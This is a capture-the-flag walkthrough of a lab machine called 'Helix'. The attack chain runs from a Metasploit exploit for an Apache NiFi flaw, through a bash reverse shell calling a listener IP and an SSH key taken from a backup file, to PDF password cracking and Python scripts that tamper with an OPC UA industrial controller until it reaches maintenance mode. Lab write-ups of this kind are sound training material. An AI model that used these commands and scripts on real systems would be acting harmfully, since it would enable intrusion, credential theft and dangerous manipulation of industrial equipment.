# Helix

> **Difficulty:** Medium  
> **Operating System:** Linux

---

## Initial Enumeration

As always, we start with some basic enumeration.

```bash
nmap -sV -sC 10.129.18.59

echo "10.129.18.59 helix.htb" | sudo tee -a /etc/hosts
```

![](images/Pasted%20image%2020260805141727.png)

The scan reveals two open ports:

- **22 (SSH)**
- **80 (HTTP)**

Heading over to the website, nothing immediately stands out.

![](images/Pasted%20image%2020260805140859.png)

Directory busting also doesn't reveal anything interesting.

```bash
gobuster dir -u http://helix.htb \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

![](images/Pasted%20image%2020260805140534.png)

Virtual host enumeration, however, proves much more useful.

```bash
gobuster vhost -u https://helix.htb \
-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
--append-domain
```

A new subdomain called **flow** is discovered.

![](images/Pasted%20image%2020260805140504.png)

After adding it to **/etc/hosts**, we browse to it and are greeted by an **Apache NiFi** instance.

![](images/Pasted%20image%2020260805142700.png)

Opening **Menu → About** reveals the server version.

![](images/Pasted%20image%2020260805142826.png)

The application is running **Apache NiFi 1.21.0**.

A quick Google search shows that this version is affected by **CVE-2023-34468**.

![](images/Pasted%20image%2020260805142932.png)

I tried several public PoCs from GitHub, but none of them worked reliably.

Instead, I switched to **Metasploit**, where I found the intended exploit with an **Excellent** reliability rating.

![](images/Pasted%20image%2020260805143429.png)

Running it gives us our initial foothold.

```bash
use exploit/multi/http/apache_nifi_processor_rce

set RHOSTS 10.129.65.117
set RPORT 80
set SSL false
set VHOST flow.helix.htb
set TARGETURI /
set LHOST 10.10.14.207
set LPORT 9001

run
```

![](images/Pasted%20image%2020260805143630.png)

Reverse shell obtained.

![](images/Pasted%20image%2020260805144130.png)

The Meterpreter shell works, but I prefer working from a regular interactive shell, so I simply launch another reverse shell.

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.170/4446 0>&1'

# Listener
nc -lvnp 4446
```

![](images/Pasted%20image%2020260805144421.png)

After reconnecting, we upgrade it into a fully interactive shell.

```bash
script /dev/null -c bash

stty raw -echo;fg
```

![](images/Pasted%20image%2020260805152719.png)

Now it's time for the usual post-exploitation checklist:

- Users
- Groups
- `sudo -l`
- Cron jobs
- Running services
- Listening ports
- Interesting files
- Configuration files

Listing users with login shells reveals another user called **operator**.

```bash
cat /etc/passwd | grep home
```

![](images/Pasted%20image%2020260805154718.png)

Before jumping directly into the listening ports, I always like checking the application's installation directory.

```bash
# Just to make life easier
alias ll='ls -la'
```

![](images/Pasted%20image%2020260805153043.png)

NiFi contains quite a few directories, so I start by listing their contents.

```bash
ll ./*
```

![](images/Pasted%20image%2020260805153304.png)

One directory immediately catches my attention because it contains a backup file named:
```
operator_id_ed25519.bak
```

In CTFs, backup files are almost always worth investigating, and in our case, the discovered file is already named "operator_id_ed25519.bak" which indicates to a public ssh key!
Sure enough, it contains **operator's SSH private key**.

```bash
cat support-bundles/operator_id_ed25519.bak
```

![](images/Pasted%20image%2020260805153403.png)

> **Note:** Even if you don't immediately stumble across files like this, it's worth making backup files part of your enumeration checklist.

```bash
find / -name "*.bak" 2>/dev/null
```

You can also customize the search for high-value files such as:
- `.conf`
- `.config`
- `.yaml`
- `.env`

![](images/Pasted%20image%2020260805154111.png)

After copying the private key to our machine and assigning the proper permissions, we can authenticate over SSH.

![](images/Pasted%20image%2020260805154635.png)

We're in.

Retrieving the user flag is straightforward.

```bash
cat user.txt
```

---

# Privilege Escalation

As always, the very first command to run is:

```bash
sudo -l
```

Surprisingly, it immediately gives us something interesting.

![](images/Pasted%20image%2020260805155652.png)

Inspecting the referenced script shows that it performs the following logic:

![](images/Pasted%20image%2020260805155919.png)

It:
1. Checks whether a **maintenance window** is active.
2. Reads `/opt/helix/state/maintenance_window`.
3. If the file contains a future timestamp, it spawns a **root shell**.
4. Otherwise, it exits with:
```
Maintenance window CLOSED
```

Naturally, the next question becomes:

**How do we open the maintenance window?**

Going back to our enumeration, one service immediately stands out.

```bash
systemctl list-units --type=service --state=running
```

![](images/Pasted%20image%2020260805160156.png)

The machine is running **helix-safety.service**.

At first glance this looks promising, but after inspecting the service and its related files, it turns out to be a rabbit hole.

```bash
systemctl cat helix-safety.service

ll /opt/helix/bin/helix-safety

ll /opt/helix/safety
```

![](images/Pasted%20image%2020260805160441.png)

So we move on.
Checking listening ports reveals something much more interesting.

![](images/Pasted%20image%2020260805160716.png)

Port **4840** is open.

This is the default port for **OPC UA (Open Platform Communications Unified Architecture)**, an industrial automation protocol.

Trying to interact with it using curl obviously doesn't work.
Instead, we go back to the running services and confirm that an **OPC UA** service is indeed running.

![](images/Pasted%20image%2020260805160156.png)

At this point it's pretty clear that this is the intended privilege escalation path.

---

One lesson I keep reminding myself with is:

**Never overlook the contents of users' home directories.**

![](images/Pasted%20image%2020260805161110.png)

Operator's home directory contains:
- A password-protected PDF
- A PNG image

Those are definitely worth investigating.

I transfer them to my local machine.

```bash
# On the target
python3 -m http.server

# On ours
wget http://helix.htb:8000/"Operator%20Control%20&%20Safety%20Guide.pdf"

wget http://helix.htb:8000/"control%20systems%20diagram.png"
```

![](images/Pasted%20image%2020260805161636.png)

Trying to open the PDF prompts for a password.

![](images/Pasted%20image%2020260805162233.png)

So we generate its hash and crack it.

```bash
pdf2john Operator\ Control\ \&\ Safety\ Guide.pdf > Hash.txt

john Hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![](images/Pasted%20image%2020260805163529.png)

After opening the document, we finally discover how the maintenance mode is supposed to be triggered.

![](images/Pasted%20image%2020260805163922.png)

Meanwhile, the PNG conveniently gives us the OPC UA endpoint we need to interact with.

![](images/Pasted%20image%2020260805164116.png)

---

To make interacting with the service easier, I first tunnel port **4840** using Chisel.

```bash
# On our machine
chisel server --reverse -p 8500
```

```bash
# On the target
./chisel client YOUR_IP:8500 R:4840:127.0.0.1:4840
```

![](images/Pasted%20image%2020260805165428.png)

The first step is to enumerate the OPC UA server and identify the available nodes together with their permissions.

The following script recursively walks through the tree and displays every node, its value and access level.

```python
from opcua import Client

client = Client("opc.tcp://127.0.0.1:4840")
client.connect()

plant = client.get_node("ns=2;i=1")

def walk(node, depth=0):
    indent = "    " * depth

    try:
        name = node.get_browse_name()
    except Exception:
        name = "?"

    print(f"{indent}{name}")
    print(f"{indent}NodeId : {node.nodeid}")

    try:
        print(f"{indent}Value  : {node.get_value()}")
    except Exception:
        print(f"{indent}Value  : <object>")

    try:
        print(f"{indent}Access : {node.get_access_level()}")
    except Exception:
        pass

    print()

    try:
        for child in node.get_children():
            walk(child, depth + 1)
    except Exception:
        pass

walk(plant)

client.disconnect()

```

> **Note:** The script occasionally crashes midway due to instability on the target. Simply rerun it and it should eventually complete.(this has happened at the time the write-up is being written, the machine is still active at this time)

![](images/Pasted%20image%2020260805170502.png)
![](images/Pasted%20image%2020260805170532.png)

After identifying the writable nodes, we create another Python script that modifies the relevant control variables:
- `Mode`
- `TestOverride`
- `CalibrationOffset

Until the PLC enters maintenance mode.

```python
from opcua import Client
import time

client = Client("opc.tcp://127.0.0.1:4840")
client.connect()

print("[+] Connected")

mode = client.get_node("ns=2;i=12")
override = client.get_node("ns=2;i=13")
offset = client.get_node("ns=2;i=6")

temp = client.get_node("ns=2;i=4")
pressure = client.get_node("ns=2;i=5")
trip = client.get_node("ns=2;i=10")

try:
    print("[*] Switching to MAINTENANCE...")
    mode.set_value("MAINTENANCE")
    time.sleep(1)

    print("[*] Enabling TestOverride...")
    override.set_value(True)
    time.sleep(1)

    print()
    print("Mode       :", mode.get_value())
    print("Override   :", override.get_value())
    print()

    current = 0.0

    while True:

        current += 0.5

        print(f"\n[*] Setting CalibrationOffset = {current}")

        offset.set_value(float(current))

        time.sleep(2)

        t = temp.get_value()
        p = pressure.get_value()
        tr = trip.get_value()
        off = offset.get_value()

        print(f"Offset      : {off}")
        print(f"Temperature : {t:.2f}")
        print(f"Pressure    : {p:.2f}")
        print(f"TripActive  : {tr}")

        if tr:
            print("\n[!] Reactor tripped!")
            break

        if t >= 295 or p >= 73:
            print("\n[+] Maintenance window should now be open!")
            input("Press ENTER after running sudo helix-maint-console...")
            break

finally:
    client.disconnect()
```

> **Note:** As with the previous script, if it crashes simply rerun it.

Once the script displays:

```
[+] Maintenance window should now be open!
```

we ==quickly== switch to another SSH session and execute:

```bash
sudo /usr/local/sbin/helix-maint-console
```

![](images/Pasted%20image%2020260805173502.png)

The maintenance window is now open, so the script grants us a **root shell**, allowing us to retrieve the final flag.
```bash
cat /root/root.txt
```
---

# Conclusion

This was a fun Medium machine.
The foothold followed a fairly realistic path by exploiting a vulnerable Apache NiFi instance, while the privilege escalation introduced **OPC UA**, which was something new for me.
Enumerating the available nodes, identifying the writable ones, and modifying the right values to trigger the maintenance window made for a unique rooting process.

Definitely an enjoyable box that mixes web exploitation with a bit of industrial control systems.

**— 0xchnk**